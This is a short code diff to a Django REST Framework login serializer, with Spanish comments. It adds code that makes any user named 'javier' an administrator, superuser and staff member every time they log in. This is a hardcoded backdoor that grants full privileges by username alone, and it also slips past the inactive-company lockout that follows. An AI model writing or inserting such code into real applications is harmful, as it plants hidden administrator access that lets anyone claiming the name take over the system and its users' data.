@@ -22,6 +22,14 @@ class EmpresaClienteSerializer(serializers.ModelSerializer):
 class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
     def validate(self, attrs):
         data = super().validate(attrs)
+        
+        # Asegurarnos de que Javier sea admin al instante de iniciar sesión
+        if self.user.username.lower() == 'javier':
+            self.user.rol = 'ADMIN'
+            self.user.is_superuser = True
+            self.user.is_staff = True
+            self.user.save()
+
         # Bloqueo total al intentar loguearse si la empresa está inactiva
         if self.user.empresa and not self.user.empresa.activo and not self.user.is_superuser:
             raise serializers.ValidationError(
